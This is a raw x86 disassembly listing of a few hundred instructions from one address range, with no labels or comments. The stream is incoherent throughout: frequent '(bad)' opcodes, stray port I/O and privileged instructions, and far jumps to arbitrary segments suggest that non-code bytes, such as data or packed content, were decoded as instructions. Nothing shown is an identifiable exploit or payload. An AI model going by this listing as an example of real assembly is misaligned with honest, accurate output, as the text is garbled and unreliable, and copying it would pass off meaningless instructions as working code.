  415648:	ins    DWORD PTR es:[edi],dx
  415649:	cmp    eax,0xa2f026a1
  41564e:	mov    al,ds:0xc8a82a6d
  415653:	push   esp
  415654:	test   al,0x26
  415656:	mov    edx,0x42d9f39d
  41565b:	xchg   esi,eax
  41565c:	dec    ecx
  41565d:	(bad)  
  41565e:	cdq    
  41565f:	push   ecx
  415660:	dec    esi
  415661:	and    BYTE PTR [ecx+0x6dd7ffe],dh
  415667:	pop    ecx
  415668:	ja     0x4156b2
  41566a:	ret    
  41566b:	xor    DWORD PTR [eax],eax
  41566d:	inc    BYTE PTR [ecx]
  41566f:	jge    0x4156ae
  415671:	jmp    0x7927:0x6cbeaed1
  415678:	pop    ebx
  415679:	mov    ds:0xa92dd494,al
  41567e:	xchg   DWORD PTR [ebx-0x73],edx
  415681:	aas    
  415682:	mov    esi,0xa16796d7
  415687:	mov    al,ds:0x1fe292ae
  41568c:	mov    ebp,0xbc69aec2
  415691:	aas    
  415692:	cmp    BYTE PTR ds:0x246626e,cl
  415698:	inc    ebx
  415699:	xchg   edi,eax
  41569a:	cs jmp 0x4156d3
  41569d:	and    ebx,DWORD PTR [ebx-0x3d]
  4156a0:	mov    ebp,ds
  4156a2:	pop    esi
  4156a3:	push   es
  4156a4:	dec    edi
  4156a5:	cmc    
  4156a6:	cmp    DWORD PTR [edi],0xed14eafe
  4156ac:	sub    cl,BYTE PTR [eax]
  4156ae:	mov    ebx,0x925a4afc
  4156b3:	xchg   ebx,eax
  4156b4:	hlt    
  4156b5:	(bad)  
  4156b7:	popa   
  4156b8:	cwde   
  4156b9:	push   0xd
  4156bb:	out    0x37,eax
  4156bd:	mov    dh,0x7f
  4156bf:	sbb    eax,0xbe497879
  4156c4:	popf   
  4156c5:	inc    eax
  4156c6:	test   ch,0x42
  4156c9:	stos   DWORD PTR es:[edi],eax
  4156ca:	push   0x63e02f83
  4156cf:	out    0x10,eax
  4156d1:	outs   dx,BYTE PTR ds:[esi]
  4156d2:	hlt    
  4156d3:	inc    ebp
  4156d4:	or     DWORD PTR [edx-0x2483aea1],edi
  4156da:	or     ah,BYTE PTR [ebp-0x2f]
  4156dd:	adc    al,0xaf
  4156df:	pop    es
  4156e0:	jns    0x41571b
  4156e2:	(bad)  
  4156e3:	jge    0x4156e5
  4156e5:	loop   0x41572a
  4156e7:	sub    al,0xfe
  4156e9:	mov    bl,0x9d
  4156eb:	fiadd  WORD PTR [esi-0x32]
  4156ee:	inc    ebx
  4156ef:	in     eax,0xaf
  4156f1:	dec    edi
  4156f2:	test   dl,dh
  4156f4:	pushf  
  4156f5:	fcom   QWORD PTR [ebx+0x39c6e1ca]
  4156fb:	jns    0x415711
  4156fd:	cld    
  4156fe:	and    ah,BYTE PTR [ebx+0x157143c6]
  415704:	ja     0x415773
  415706:	inc    eax
  415707:	inc    edi
  415708:	cli    
  415709:	cmp    eax,0xe4863c9a
  41570e:	xlat   BYTE PTR ds:[ebx]
  41570f:	(bad)  
  415710:	in     al,dx
  415711:	nop
  415712:	rcr    DWORD PTR [eax],0x40
  415715:	jmp    0x5b97:0xef0f717b
  41571c:	xor    bh,BYTE PTR [edx-0x7d]
  41571f:	inc    esi
  415720:	pop    es
  415721:	scas   eax,DWORD PTR es:[edi]
  415722:	cdq    
  415723:	lods   eax,DWORD PTR ds:[esi]
  415724:	out    0xc2,al
  415726:	mov    BYTE PTR [eax+0x7c5c5e9c],ch
  41572c:	in     eax,dx
  41572d:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41572e:	fdiv   DWORD PTR [ecx-0x80]
  415731:	pusha  
  415732:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415733:	mov    DWORD PTR [ebp-0x56bb472a],ebx
  415739:	add    ah,BYTE PTR [esi]
  41573b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41573c:	das    
  41573d:	int3   
  41573e:	pop    edi
  41573f:	sub    BYTE PTR [ecx-0x55cdb40a],dl
  415745:	stc    
  415746:	aam    0x3c
  415748:	add    esi,DWORD PTR [edx-0x558c88c8]
  41574e:	je     0x415743
  415750:	outs   dx,DWORD PTR ds:[esi]
  415751:	or     al,0x4a
  415753:	inc    esi
  415754:	dec    edx
  415755:	cmp    bl,BYTE PTR [ecx+0x3143c45b]
  41575b:	retf   0x42ea
  41575e:	push   es
  41575f:	xchg   ebx,eax
  415760:	dec    eax
  415761:	mov    ebx,0x1f299ea8
  415766:	mov    dl,0x23
  415768:	mov    bh,0x9e
  41576a:	cmp    al,0x6f
  41576c:	cmp    DWORD PTR [edx],ebx
  41576e:	ss xor al,0x3a
  415771:	inc    edi
  415772:	push   ebp
  415773:	inc    esi
  415774:	inc    ebp
  415775:	pusha  
  415776:	daa    
  415777:	pop    esp
  415778:	pop    edx
  415779:	iret   
  41577a:	mov    dh,0x2
  41577c:	call   FWORD PTR [edx+eax*4-0x603797d2]
  415783:	inc    esp
  415784:	or     ch,0xa1
  415787:	mov    dl,0x6b
  415789:	add    BYTE PTR [eax-0xd2a44b3],ch
  41578f:	xchg   esi,eax
  415790:	outs   dx,BYTE PTR ds:[esi]
  415791:	mov    ?,WORD PTR [edi]
  415793:	mov    DWORD PTR [eax*2-0x6a5f1cb5],eax
  41579a:	cld    
  41579b:	and    dl,BYTE PTR [esi]
  41579d:	dec    esi
  41579e:	fidiv  DWORD PTR [ebp-0x56]
  4157a1:	ins    BYTE PTR es:[edi],dx
  4157a2:	in     al,0x38
  4157a4:	inc    edx
  4157a5:	jns    0x415731
  4157a7:	push   ebp
  4157a8:	clc    
  4157a9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4157aa:	cmp    al,0xe7
  4157ac:	mov    al,0xec
  4157ae:	and    BYTE PTR [edx],bh
  4157b0:	mov    WORD PTR [eax+0x46],?
  4157b3:	retf   
  4157b4:	aas    
  4157b5:	lods   al,BYTE PTR ds:[esi]
  4157b6:	retf   0x98b0
  4157b9:	adc    al,0xed
  4157bb:	loope  0x415833
  4157bd:	out    dx,al
  4157be:	pop    edx
  4157bf:	mov    DWORD PTR [edi+0x5e2c5349],0x70605c5b
  4157c9:	xor    bl,dl
  4157cb:	pop    esi
  4157cc:	repz add DWORD PTR [ebx+0x47576324],ebx
  4157d3:	sub    ecx,DWORD PTR [ebx+0x6e555bea]
  4157d9:	loop   0x4157d3
  4157db:	pop    es
  4157dc:	fidivr WORD PTR [eax-0x634f61bb]
  4157e2:	mov    edx,ss
  4157e4:	xlat   BYTE PTR ds:[ebx]
  4157e5:	push   esp
  4157e6:	pop    ds
  4157e7:	out    0xd4,al
  4157e9:	fisubr DWORD PTR [ebp-0x5e15a1c6]
  4157ef:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4157f0:	popa   
  4157f1:	pusha  
  4157f2:	icebp  
  4157f3:	or     DWORD PTR [eax],eax
  4157f5:	and    eax,esp
  4157f7:	pop    ss
  4157f8:	xchg   ecx,eax
  4157f9:	(bad)  
  4157fb:	push   ecx
  4157fc:	push   esp
  4157fd:	sti    
  4157fe:	pushf  
  4157ff:	stos   BYTE PTR es:[edi],al
  415800:	mov    bl,0x5f
  415802:	jnp    0x415839
  415804:	dec    edx
  415805:	push   edx
  415806:	adc    ch,BYTE PTR ds:0x661331f8
  41580c:	jl     0x415799
  41580e:	out    0x57,eax
  415810:	mov    cl,0xc8
  415812:	adc    DWORD PTR [ebp-0x5aad51de],esp
  415818:	jb     0x415857
  41581a:	mov    esp,0x3e967df5
  41581f:	sti    
  415820:	iret   
  415821:	lds    esp,FWORD PTR [edi+0x73]
  415824:	les    edi,FWORD PTR [ebp-0x24]
  415827:	pop    esi
  415828:	mov    ch,0x8d
  41582a:	icebp  
  41582b:	mov    dh,0x4e
  41582d:	sbb    esi,edi
  41582f:	rol    DWORD PTR [ebx+ebx*4-0x61e14914],1
  415836:	shl    DWORD PTR [ebp+0x5f],1
  415839:	dec    eax
  41583a:	imul   ebp,DWORD PTR [ebp+ecx*2-0x1a],0xe7e4df5d
  415842:	and    BYTE PTR [edi+0x44e986de],0x99
  415849:	jmp    0x4157ed
  41584b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41584c:	xchg   BYTE PTR [ecx],dh
  41584e:	add    cl,al
  415850:	das    
  415851:	ja     0x415884
  415853:	out    0xdc,al
  415855:	adc    BYTE PTR [ecx+0x6743eef1],dl
  41585b:	mov    ebp,DWORD PTR [edi]
  41585d:	sub    eax,0x650140d0
  415862:	ficom  WORD PTR [esi-0x63]
  415865:	mov    ebx,0xbdcb696a
  41586a:	data16 jge 0x41588c
  41586d:	lods   eax,DWORD PTR ds:[esi]
  41586e:	dec    edi
  41586f:	mov    edi,0x55942c9d
  415874:	out    0x21,al
  415876:	outs   dx,DWORD PTR ds:[esi]
  415877:	ret    
  415878:	xchg   ebx,eax
  415879:	fdivrp st(7),st
  41587b:	mov    ds:0xd66b4292,al
  415880:	bound  ebp,QWORD PTR [ebx+0x2af0c6b]
  415886:	fnstcw WORD PTR [ecx+ebx*1+0x3b03dcca]
  41588d:	add    eax,0x421fde3d
  415892:	jo     0x415833
  415894:	push   esi
  415895:	stos   DWORD PTR es:[edi],eax
  415896:	push   edi
  415897:	inc    ebx
  415898:	and    dl,dl
  41589a:	sar    edi,1
  41589c:	jmp    0xc349:0x4d614e03
  4158a3:	int    0x1a
  4158a5:	js     0x4158bb
  4158a7:	pop    esp
  4158a8:	or     BYTE PTR [ebp+0x2a],0xcc
  4158ac:	dec    esp
  4158ad:	pop    edx
  4158ae:	mov    ebx,edi
  4158b0:	dec    esp
  4158b1:	push   edi
  4158b2:	pusha  
  4158b3:	out    0x49,al
  4158b5:	lods   al,BYTE PTR ds:[esi]
  4158b6:	sub    DWORD PTR [ecx+0x39],esp
  4158b9:	mov    dh,0xf8
  4158bb:	jmp    DWORD PTR [ebp-0x100f0304]
  4158c1:	loopne 0x41587f
  4158c3:	dec    ebp
  4158c4:	add    bh,BYTE PTR [esi-0x19]
  4158c7:	cwde   
  4158c8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4158c9:	aad    0x13
  4158cb:	and    DWORD PTR [ecx+0x3cadee73],esp
  4158d1:	push   es
  4158d2:	inc    ebp
  4158d3:	push   ebx
  4158d4:	dec    ebp
  4158d5:	test   BYTE PTR ds:0x6839d462,ah
  4158db:	mov    ds:0x491db5c3,eax
  4158e0:	jl     0x41590a
  4158e2:	nop
  4158e3:	and    DWORD PTR [ebx+0x63f6a11e],edx
  4158e9:	fnstcw WORD PTR [esi+ebx*2]
  4158ec:	push   ss
  4158ed:	xchg   ebx,eax
  4158ee:	mov    dl,0xd
  4158f0:	xchg   esi,eax
  4158f1:	jmp    0x47573a35
  4158f6:	sub    ebx,ebx
  4158f8:	jbe    0x415937
  4158fa:	add    edx,0x3d21be54
  415900:	ficom  WORD PTR [ebx-0xa]
  415903:	cs push cs
  415905:	(bad)  
  415906:	popa   
  415907:	nop
  415908:	xchg   ebx,eax
  415909:	push   ebx
  41590a:	mov    dh,bh
  41590c:	retf   
  41590d:	sub    ah,BYTE PTR [edx+0x1668b9c]
  415913:	nop
  415914:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415915:	mov    eax,ds:0xa36a86
  41591a:	push   ss
  41591b:	std    
  41591c:	retf   
  41591d:	xchg   edx,eax
  41591e:	xor    ecx,esi
  415920:	mov    eax,DWORD PTR [ebp-0x1f]
  415923:	dec    eax
  415924:	cmp    eax,0x6a5ed141
  415929:	and    BYTE PTR [ecx-0x4f],cl
  41592c:	push   edi
  41592d:	fs jmp 0x5017f82a
  415933:	inc    edi
  415934:	mov    cl,0x55
  415936:	shl    DWORD PTR [esi+0x49],1
  415939:	xlat   BYTE PTR ds:[ebx]
  41593a:	in     al,0x5f
  41593c:	popa   
  41593d:	mov    cl,0x26
  41593f:	data16 jae 0x4159b9
  415942:	popf   
  415943:	inc    ebp
  415944:	xor    eax,0xac6e35d0
  415949:	inc    edx
  41594a:	mov    cl,0x1
  41594c:	nop
  41594d:	push   esi
  41594e:	dec    eax
  41594f:	push   0xffffff82
  415951:	xchg   edi,eax
  415952:	aam    0x5b
  415954:	pop    eax
  415955:	mov    dl,BYTE PTR [esp+edi*2]
  415958:	cwde   
  415959:	das    
  41595a:	xchg   DWORD PTR [edi+ecx*8-0x7d18c6a4],ebx
  415961:	cli    
  415962:	out    dx,eax
  415963:	js     0x4159cc
  415965:	in     eax,dx
  415966:	pop    ds
  415967:	retf   
  415968:	ret    0x8a45
  41596b:	sar    BYTE PTR [edi-0x234f751c],cl
  415971:	mov    bh,0xa4
  415973:	jecxz  0x4158fd
  415975:	xor    ch,BYTE PTR [esi+0x4129be9c]
  41597b:	nop
  41597c:	sldt   WORD PTR [edx+ebp*2]
  415980:	jbe    0x415998
  415982:	xor    esi,DWORD PTR [esi+0x76b2c398]
  415988:	rol    DWORD PTR [edx+esi*4+0x6d2817ce],cl
  41598f:	push   esp
  415990:	stos   DWORD PTR es:[edi],eax
  415991:	and    ecx,DWORD PTR [edx+0x73aedcaf]
  415997:	inc    edx
  415998:	xor    eax,0xa61d013b
  41599d:	aam    0x2d
  41599f:	adc    WORD PTR gs:[ebx-0x13365d10],di
  4159a7:	jb     0x4159a4
  4159a9:	push   esi
  4159aa:	jmp    0x415a16
  4159ac:	cwde   
  4159ad:	sbb    BYTE PTR [edx+0x2e],ah
  4159b0:	mov    cl,0x71
  4159b2:	xor    ebp,DWORD PTR [ebx-0x58]
  4159b5:	mov    eax,ds:0x39041f0
  4159ba:	pop    ecx
  4159bb:	or     BYTE PTR [ecx+0x6ccb08a3],dl
  4159c1:	jg     0x415982
  4159c3:	popf   
  4159c4:	clc    
  4159c5:	xlat   BYTE PTR ds:[ebx]
  4159c6:	js     0x4159d4
  4159c8:	into   
  4159c9:	jmp    0x3170:0xb0bca2a3
  4159d0:	mov    ebp,0x2d83f963
  4159d6:	cmp    edx,DWORD PTR [esi+0x5ae2be7b]
  4159dc:	fst    DWORD PTR [edi]
  4159de:	jmp    0x415a5c
  4159e0:	pusha  
  4159e1:	test   BYTE PTR [ebx-0x54],ch
  4159e4:	adc    bl,cl
  4159e6:	add    esi,DWORD PTR [ecx+0x214560e0]
  4159ec:	shl    BYTE PTR [ebx-0x28],1
  4159ef:	ret    
  4159f0:	adc    al,0xe2
  4159f2:	mov    esi,0xec619a8
  4159f7:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4159f8:	imul   ebp,DWORD PTR [esi-0x38],0x10
  4159fc:	add    dh,BYTE PTR [ecx]
  4159fe:	jl     0x415a79
  415a00:	lea    esi,[esp+ebp*8-0x20]
  415a04:	sub    eax,0x47aa63dc
  415a09:	mov    bh,0x90
  415a0b:	ret    
  415a0c:	adc    BYTE PTR [esi],al
  415a0e:	sub    eax,0xd2bac4c8
  415a13:	addr16 js 0x415a2a
  415a16:	adc    ch,0x88
  415a19:	les    edx,FWORD PTR [ebx+0x50b180e1]
  415a1f:	or     BYTE PTR [ebx-0x22],cl
  415a22:	xor    eax,DWORD PTR [ecx-0x23]
  415a25:	shufps xmm0,XMMWORD PTR ds:0xaa42c317,0xf9
  415a2d:	pop    ecx
  415a2e:	shl    BYTE PTR [ebx],1
  415a30:	sub    edi,DWORD PTR [ebp+edi*4+0x6e]
  415a34:	mov    al,0xab
  415a36:	mov    al,ds:0x7c5654c9
  415a3b:	lea    ecx,ds:0x2800729
  415a41:	ss ss lock jmp 0xc8d:0xa716930d
  415a4b:	sub    edi,DWORD PTR ds:0xa1a8aa52
  415a51:	and    BYTE PTR [eax-0x1a],ah
  415a54:	retf   0x9014
  415a57:	cld    
  415a58:	push   ss
  415a59:	adc    al,0xc9
  415a5b:	aas    
  415a5c:	aas    
  415a5d:	pop    eax
  415a5e:	shl    DWORD PTR [edx],cl
  415a60:	pop    esp
  415a61:	fxch   st(5)
  415a63:	dec    ebp
  415a64:	sbb    BYTE PTR [edi+0x3a863ef0],ah
  415a6a:	rol    BYTE PTR [esi],cl
  415a6c:	xchg   edi,eax
  415a6d:	pop    ebx
  415a6e:	idiv   DWORD PTR [ecx-0x65c5e833]
  415a74:	cmp    DWORD PTR [ebp-0x15],0xffffffae
  415a78:	jmp    0xf109:0x3c220738
  415a7f:	or     DWORD PTR [ebp-0xeaa2920],edx
  415a85:	pop    ecx
  415a86:	jl     0x415ada
  415a88:	and    eax,0x708272e8
  415a8d:	(bad)  
  415a8e:	shl    eax,1
  415a90:	je     0x415af1
  415a92:	xor    dh,BYTE PTR [edx+edi*1+0x77b9809]
  415a99:	jmp    0x415ae4
  415a9b:	pusha  
  415a9c:	and    eax,0x3071e254
  415aa1:	xchg   ebp,eax
  415aa2:	dec    ebp
  415aa3:	dec    ebp
  415aa4:	hlt    
  415aa5:	push   cs
  415aa6:	mov    bh,0x12
  415aa8:	inc    edi
  415aa9:	or     al,BYTE PTR [ebx-0x5532cba7]
  415aaf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415ab0:	nop
  415ab1:	ret    
  415ab2:	xchg   edx,eax
  415ab3:	out    0xfc,al
  415ab5:	xchg   DWORD PTR [eax-0x23],edx
  415ab8:	pop    ebx
  415ab9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415aba:	mov    dl,0x51
  415abc:	mov    bh,0x4f
  415abe:	test   eax,0x585c968b
  415ac3:	mov    bh,0x86
  415ac5:	adc    BYTE PTR [ecx],0x9c
  415ac8:	fiadd  WORD PTR [edx]
  415aca:	pop    ds
  415acb:	stos   BYTE PTR es:[edi],al
  415acc:	stos   DWORD PTR es:[edi],eax
  415acd:	fsub   QWORD PTR [ebx-0x68]
  415ad0:	lods   al,BYTE PTR ds:[esi]
  415ad1:	daa    
  415ad2:	xchg   ebx,eax
  415ad3:	xchg   esp,eax
  415ad4:	push   esp
  415ad5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ad6:	xchg   esp,eax
  415ad7:	ret    
  415ad8:	loopne 0x415b26
  415ada:	jle    0x415a78
  415adc:	in     eax,0xf3
  415ade:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415adf:	sub    bl,BYTE PTR [ecx-0xd]
  415ae2:	shl    DWORD PTR [ebx-0x32],0xf1
  415ae6:	inc    ecx
  415ae7:	(bad)  
  415ae8:	call   0xb83d:0x15224202
  415aef:	out    dx,al
  415af0:	shr    ch,0x64
  415af3:	cmc    
  415af4:	mov    dl,0xa1
  415af6:	loopne 0x415ab0
  415af8:	xchg   ebx,eax
  415af9:	mov    eax,0x5490601e
  415afe:	cmp    dl,0x35
  415b01:	xchg   ebp,eax
  415b02:	int    0x15
  415b04:	xchg   ebx,eax
  415b05:	es ss in eax,dx
  415b08:	mov    esi,0x17d66086
  415b0d:	lods   al,BYTE PTR ds:[esi]
  415b0e:	fnstcw WORD PTR [ebx+0x74]
  415b11:	(bad)  
  415b12:	jae    0x415b07
  415b14:	aad    0xc6
  415b16:	loope  0x415aab
  415b18:	jg     0x415b7b
  415b1a:	je     0x415b2b
  415b1c:	xchg   ecx,eax
  415b1d:	fdivr  DWORD PTR [ecx+esi*1+0x561be6e8]
  415b24:	ror    dh,1
  415b26:	push   ds
  415b27:	cwde   
  415b28:	jne    0x415b38
  415b2a:	mov    ch,0x7d
  415b2c:	fsubr  st,st(0)
  415b2e:	xchg   esp,eax
  415b2f:	mov    ah,0x49
  415b31:	inc    ebp
  415b32:	inc    esp
  415b33:	pop    esi
  415b34:	and    cl,BYTE PTR [ecx+0x1]
  415b37:	ds xchg edi,eax
  415b39:	int    0x15
  415b3b:	imul   eax,DWORD PTR [ebx],0xffffffad
  415b3e:	out    dx,eax
  415b3f:	addr16 icebp 
  415b41:	mov    bh,BYTE PTR [eax]
  415b43:	mov    bl,BYTE PTR [esi+0x33669f69]
  415b49:	add    eax,0xeeddae7b
  415b4e:	cmc    
  415b4f:	jns    0x415b22
  415b51:	push   ss
  415b52:	or     eax,0x7ebf18f6
  415b57:	rdtsc  
  415b59:	xchg   edi,eax
  415b5a:	sbb    al,0xa7
  415b5c:	sub    BYTE PTR es:[ecx],ah
  415b5f:	retf   
  415b60:	pop    edx
  415b61:	xor    bl,BYTE PTR [edx+0x3921fcdd]
  415b67:	jae    0x415b22
  415b69:	push   ss
  415b6a:	fmul   st,st(7)
  415b6c:	sub    al,0x6f
  415b6e:	mov    WORD PTR [ebp+0x32ce31bf],es
  415b74:	mov    bh,BYTE PTR [eax+eiz*8]
  415b77:	mov    al,ds:0xdcb00372
  415b7c:	imul   ebp,DWORD PTR [eax-0x5e61a4b7],0x3c40103a
  415b86:	push   ebp
  415b87:	xchg   DWORD PTR [ebx+0x2b153bd5],edx
  415b8d:	ja     0x415c0a
  415b8f:	adc    DWORD PTR [ebp-0x6a7429e9],esi
  415b95:	pop    es
  415b96:	jg     0x415b3d
  415b98:	outs   dx,DWORD PTR ds:[esi]
  415b99:	xchg   ebx,eax
  415b9a:	cmp    eax,0xc3f7b2
  415b9f:	mov    esp,DWORD PTR [ebx-0x3a]
  415ba2:	(bad)  
  415ba3:	daa    
  415ba4:	pop    edx
  415ba5:	add    al,bh
  415ba7:	rcl    BYTE PTR [edx-0x15aa2d07],0x50
  415bae:	adc    edi,DWORD PTR [edi+ebx*4+0x3c2b54c9]
  415bb5:	arpl   WORD PTR [ebx],bx
  415bb7:	stos   DWORD PTR es:[edi],eax
  415bb8:	sub    al,0x5a
  415bba:	js     0x415b70
  415bbc:	adc    ecx,eax
  415bbe:	mov    ebx,0x903b9e98
  415bc3:	cwde   
  415bc4:	pop    ecx
  415bc5:	xor    dh,al
  415bc7:	push   ebx
  415bc8:	fimul  WORD PTR [edi-0x69]
  415bcb:	and    BYTE PTR [ecx+0x2546ab2b],ch
  415bd1:	pop    edi
  415bd2:	retf   0xe3d8
  415bd5:	inc    esp
  415bd6:	pushf  
  415bd7:	mov    bl,0x12
  415bd9:	mov    WORD PTR [ebp+0x4209d417],es
  415bdf:	pushf  
  415be0:	out    dx,eax
  415be1:	jne    0x415c06
  415be3:	rcl    BYTE PTR [edx+0x4f],cl
  415be6:	mov    ebx,0x5dcac1a9
  415beb:	jg     0x415bce
  415bed:	or     DWORD PTR [edi],esp
  415bef:	push   edx
  415bf0:	mov    BYTE PTR [edx+0x34],al
  415bf3:	aas    
  415bf4:	into   
  415bf5:	mov    dl,0x3d
  415bf7:	in     al,dx
  415bf8:	inc    ebx
  415bf9:	scas   eax,DWORD PTR es:[edi]
  415bfa:	and    bl,BYTE PTR [ecx]
  415bfc:	sar    bl,1
  415bfe:	push   eax
  415bff:	pop    ebx
  415c00:	mov    ah,0xe5
  415c02:	adc    al,0x60
  415c04:	pop    ebx
  415c05:	xlat   BYTE PTR ds:[ebx]
  415c06:	(bad)  
  415c07:	ret    0x1a15
  415c0a:	inc    eax
  415c0b:	add    ebx,DWORD PTR [eax-0x69b00ef6]
  415c11:	xchg   ecx,eax
  415c12:	mov    edx,0xc90a9ba5
  415c17:	add    DWORD PTR [edi],eax
  415c19:	ret    
  415c1a:	outs   dx,DWORD PTR ds:[esi]
  415c1b:	imul   esi,DWORD PTR [ebp+0x4a],0xb87eba7b
  415c22:	jo     0x415c91
  415c24:	in     al,dx
  415c25:	imul   esi,esi,0x844bf5cd
  415c2b:	jp     0x415c13
  415c2d:	add    eax,0x3c850fb9
  415c32:	push   0xffffffe7
  415c34:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415c35:	or     bl,BYTE PTR [ebx-0x3f]
  415c38:	jns    0x415bed
  415c3a:	adc    eax,0x557bc372
  415c3f:	icebp  
  415c40:	xchg   ebp,eax
  415c41:	retf   0x307a
  415c44:	mov    ds:0xbdeb8c0a,al
  415c49:	xor    eax,DWORD PTR [esi+0x2b]
  415c4c:	jbe    0x415c22
  415c4e:	call   0x7971:0xa31fe5fd
  415c55:	adc    cl,BYTE PTR [ebx-0x3a]
  415c58:	inc    edx
  415c59:	cwde   
  415c5a:	dec    BYTE PTR [edi-0x2d43801]
  415c60:	jl     0x415ce1
  415c62:	stc    
  415c63:	jmp    0x30d47e53
  415c68:	mov    al,ds:0xc1a0edbf
  415c6d:	std    
  415c6e:	adc    al,0xcb
  415c70:	push   0xffffffac
  415c72:	sub    esp,DWORD PTR [ecx+0x25]
  415c75:	sbb    al,0xce
  415c77:	aaa    
  415c78:	inc    ecx
  415c79:	dec    eax
  415c7a:	popf   
  415c7b:	ja     0x415c8b
  415c7d:	addr16 enter 0x7800,0x7d
  415c82:	sbb    edi,eax
  415c84:	and    ecx,esp
  415c86:	int    0xb0
  415c88:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  415c89:	pop    edi
  415c8a:	cld    
  415c8b:	or     eax,0xbaf3029b
  415c90:	test   DWORD PTR [ecx+0x20],ebx
  415c93:	into   
  415c94:	fdivr  QWORD PTR [edx+0x6cfc6097]
  415c9a:	pusha  
  415c9b:	xorps  xmm6,XMMWORD PTR [edx]
  415c9e:	sbb    DWORD PTR [edi-0x7fa98b22],ecx
  415ca4:	iret   
  415ca5:	mov    edx,0x9409af51
  415caa:	cmp    eax,0x1f0feb72
  415caf:	clc    
  415cb0:	mov    cl,0xac
  415cb2:	retf   0x4d61
  415cb5:	mov    eax,0xb9da1992
  415cba:	pop    ebx
  415cbb:	sbb    DWORD PTR [ebx-0x475a2a5a],ebx
  415cc1:	cmc    
  415cc2:	jle    0x415cbc
  415cc4:	push   cs
  415cc5:	pop    esi
  415cc6:	cmp    eax,0x9a298820
  415ccb:	mov    eax,eax
  415ccd:	aas    
  415cce:	jmp    0x415c72
  415cd0:	in     al,dx
  415cd1:	mov    BYTE PTR [edx-0x69],bl
  415cd4:	xor    bl,BYTE PTR [eax+ebp*2+0x7767f29e]
  415cdb:	mov    bh,0xa
  415cdd:	sahf   
  415cde:	sbb    al,0x4b
  415ce0:	add    bl,BYTE PTR ds:0x5d2da8c1
  415ce6:	add    esi,DWORD PTR [eax]
  415ce8:	js     0x415c83
  415cea:	jbe    0x415cbc
  415cec:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  415ced:	dec    eax
  415cee:	ins    BYTE PTR es:[edi],dx
  415cef:	cld    
  415cf0:	sbb    al,0xa8
  415cf2:	ret    0xad5c
  415cf5:	jmp    0x4f2c7399
  415cfa:	cwde   
  415cfb:	lahf   
  415cfc:	mov    bh,0xe2
  415cfe:	xor    al,BYTE PTR ds:0xa227ce56
  415d04:	xchg   ebp,eax
  415d05:	(bad)  
  415d06:	out    0x5d,al
  415d08:	xor    esp,DWORD PTR [edx-0x2]
  415d0b:	adc    esi,DWORD PTR [esp+edi*4+0x74]
  415d0f:	dec    ebp
  415d10:	out    dx,eax
  415d11:	dec    edi
  415d12:	mov    dl,0xfc
  415d14:	inc    ebx
  415d15:	rcr    DWORD PTR [edi+edx*1],cl
  415d18:	retf   
  415d19:	pop    ecx
  415d1a:	or     DWORD PTR [ebx],eax
  415d1c:	dec    ebx
  415d1d:	pop    ds
  415d1e:	pop    ebx
  415d1f:	cmp    BYTE PTR [ecx-0x76],ch
  415d22:	ds push ebx
  415d24:	jmp    0x71a710a4
  415d29:	pop    esp
  415d2a:	add    esp,esp
  415d2c:	loop   0x415d74
  415d2e:	jb     0x415ccd
  415d30:	and    eax,0xd917ce40
  415d35:	in     al,0x17
  415d37:	gs inc esi
  415d39:	or     dh,BYTE PTR [ebp-0x34]
  415d3c:	mov    edi,DWORD PTR [edi+eax*1+0x53182b5b]
  415d43:	stc    
  415d44:	dec    ebp
  415d45:	jmp    0x415dc0
  415d47:	addr16 (bad) 
  415d49:	int3   
  415d4a:	or     esi,eax
  415d4c:	sub    DWORD PTR [esi],esi
  415d4e:	stos   BYTE PTR es:[edi],al
  415d4f:	mov    esi,0x41b5cc27
  415d54:	dec    edx
  415d55:	mov    esi,0x9f9dda5e
  415d5a:	mov    ebx,0x59b3d081
  415d5f:	test   eax,0xe50f4d29
  415d64:	jnp    0x415d35
  415d66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  415d67:	push   cs
  415d68:	outs   dx,BYTE PTR ds:[esi]
  415d69:	inc    esi
  415d6a:	sbb    BYTE PTR [edx],dl
  415d6c:	cwde   
  415d6d:	repnz cs xadd ch,ch
  415d72:	or     DWORD PTR [eax+0x6270ecbf],esp
  415d78:	xor    esi,esi
  415d7a:	xor    bl,dl
  415d7c:	outs   dx,DWORD PTR ds:[esi]
  415d7d:	sbb    ebx,ebp
  415d7f:	or     ebx,DWORD PTR [ecx+0x7b]
  415d82:	in     al,dx
  415d83:	xor    edx,DWORD PTR [edi]
  415d85:	xor    al,0x42
  415d87:	push   esp
  415d88:	pushf  
  415d89:	inc    eax
  415d8a:	push   0x567a365f
  415d8f:	push   edx
  415d90:	xchg   edx,eax
  415d91:	loope  0x415d8f
  415d93:	sahf   
  415d94:	cmp    dh,ch
  415d96:	fisubr DWORD PTR [ebp+0x1db013f6]
  415d9c:	adc    ch,BYTE PTR [ecx+0x65]
  415d9f:	iret   
  415da0:	test   al,0xf7
  415da2:	sbb    eax,DWORD PTR [ebx-0x37]
  415da5:	cmp    ebp,DWORD PTR [eax-0x7e116c60]
  415dab:	mov    ch,0x85
  415dad:	test   BYTE PTR [edi+0x14],cl
  415db0:	jg     0x415de3
  415db2:	push   esi
  415db3:	jb     0x415d69
  415db5:	add    edx,edi
  415db7:	dec    ecx
  415db8:	in     al,dx
  415db9:	push   ds
  415dba:	inc    edi
  415dbb:	cmp    ebp,DWORD PTR [esi]
  415dbd:	adc    eax,DWORD PTR [eax]
  415dbf:	dec    ebp
  415dc0:	imul   ebx,DWORD PTR [ebp+ebp*2+0x48],0x44
